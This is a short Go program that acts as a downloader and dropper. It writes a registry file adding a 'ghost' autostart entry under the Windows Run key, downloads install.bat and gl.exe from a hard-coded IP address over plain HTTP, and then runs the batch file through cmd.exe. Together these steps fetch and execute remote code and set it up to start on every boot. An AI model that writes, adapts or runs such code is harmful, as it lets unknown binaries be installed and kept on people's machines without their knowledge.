package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
)

func main() {
	Write1("greg.reg", "Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"ghost\"=\"D:\\\\ProgramData\\\\Ghost\\\\gl.exe\"\n\n")
	Write1("C:\\Program Files\\test.txt", "test.txt")
	dlFile("http://39.100.5.139/ghost/install.bat", "install.bat")
	dlFile("http://39.100.5.139/ghost/gl.exe", "gl.exe")
	c := exec.Command("C:\\Windows\\System32\\cmd.exe", "/C", "install.bat")
	//c:=exec.Command("install.bat")
	if err := c.Start(); err != nil {
		panic(err)
	}
}

func Write1(fileName string, str string) {
	//fileName := "file/test2"
	//strTest := "测试测试"
	var d = []byte(str)
	err := ioutil.WriteFile(fileName, d, 0666)
	if err != nil {
		fmt.Println("write fail")
	}
	fmt.Println("write success")
}
func dlFile(url string, target string) {

	res, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	f, err := os.Create(target)
	if err != nil {
		panic(err)
	}
	io.Copy(f, res.Body)
}
